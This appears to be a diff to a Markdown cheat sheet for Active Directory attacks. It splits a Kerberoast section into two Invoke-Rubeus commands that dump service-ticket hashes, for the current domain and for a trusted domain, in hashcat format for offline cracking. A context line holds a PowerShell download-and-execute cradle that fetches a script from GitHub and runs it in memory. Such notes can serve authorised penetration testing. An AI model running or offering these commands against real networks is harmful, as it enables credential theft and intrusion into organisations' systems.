@@ -10,7 +10,12 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 
 # Commands
 
-## Kerberoast
+## Kerberoast for the current domain
 ```powershell
-Invoke-Rubeus 'kerberoast /outfile:hashes.txt /user:USER /domain:DOMAIN /dc:DOMAIN_CONTROLLER'
+Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat'
+```
+
+## Kerberoast for a trusted domain
+```powershell
+Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
 ```
